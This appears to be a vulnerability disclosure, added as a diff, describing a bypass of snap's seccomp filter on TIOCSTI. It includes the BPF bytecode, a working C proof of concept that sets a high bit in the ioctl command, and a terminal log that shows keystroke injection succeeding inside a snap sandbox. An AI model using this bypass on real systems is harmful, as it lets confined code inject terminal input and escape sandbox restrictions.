@@ -1,0 +1,78 @@
+/*
+snap uses a seccomp filter to prevent the use of the TIOCSTI ioctl; in the
+source code, this filter is expressed as follows:
+
+  # TIOCSTI allows for faking input (man tty_ioctl)
+  # TODO: this should be scaled back even more
+  ioctl - !TIOCSTI
+
+In the X86-64 version of the compiled seccomp filter, this results in the
+following BPF bytecode:
+
+  [...]
+  0139 if nr == 0x00000010: [true +0, false +3]
+  013b   if args[1].high != 0x00000000: [true +205, false +0] -> ret ALLOW (syscalls: ioctl)
+  0299   if args[1].low == 0x00005412: [true +111, false +112] -> ret ERRNO
+  030a   ret ALLOW (syscalls: ioctl)
+  [...]
+
+This bytecode performs a 64-bit comparison; however, the syscall entry point for
+ioctl() is defined with a 32-bit command argument in the kernel:
+
+SYSCALL_DEFINE3(ioctl, unsigned int, fd, unsigned int, cmd, unsigned long, arg)
+{
+  return ksys_ioctl(fd, cmd, arg);
+}
+
+This means that setting a bit in the high half of the command parameter will
+circumvent the seccomp filter while being ignored by the kernel.
+
+This can be tested as follows on Ubuntu 18.04. You might have to launch the
+GNOME calculator once first to create the snap directory hierarchy, I'm not
+sure.
+
+====================================================================
+user@ubuntu-18-04-vm:~$ cat tiocsti.c
+*/
+
+#define _GNU_SOURCE
+#include <termios.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/syscall.h>
+#include <errno.h>
+
+static int ioctl64(int fd, unsigned long nr, void *arg) {
+  errno = 0;
+  return syscall(__NR_ioctl, fd, nr, arg);
+}
+
+int main(void) {
+  int res;
+  char pushmeback = '#';
+  res = ioctl64(0, TIOCSTI, &pushmeback);
+  printf("normal TIOCSTI: %d (%m)\n", res);
+  res = ioctl64(0, TIOCSTI | (1UL<<32), &pushmeback);
+  printf("high-bit-set TIOCSTI: %d (%m)\n", res);
+}
+
+/*
+user@ubuntu-18-04-vm:~$ gcc -o tiocsti tiocsti.c -Wall
+user@ubuntu-18-04-vm:~$ ./tiocsti
+#normal TIOCSTI: 0 (Success)
+#high-bit-set TIOCSTI: 0 (Success)
+user@ubuntu-18-04-vm:~$ ##
+user@ubuntu-18-04-vm:~$ cp tiocsti /home/user/snap/gnome-calculator/current/tiocsti
+user@ubuntu-18-04-vm:~$ snap run --shell gnome-calculator
+[...]
+user@ubuntu-18-04-vm:/home/user$ cd
+user@ubuntu-18-04-vm:~$ ./tiocsti
+normal TIOCSTI: -1 (Operation not permitted)
+#high-bit-set TIOCSTI: 0 (Success)
+user@ubuntu-18-04-vm:~$ #
+user@ubuntu-18-04-vm:~$ pwd
+/home/user/snap/gnome-calculator/260
+user@ubuntu-18-04-vm:~$ 
+====================================================================
+*/
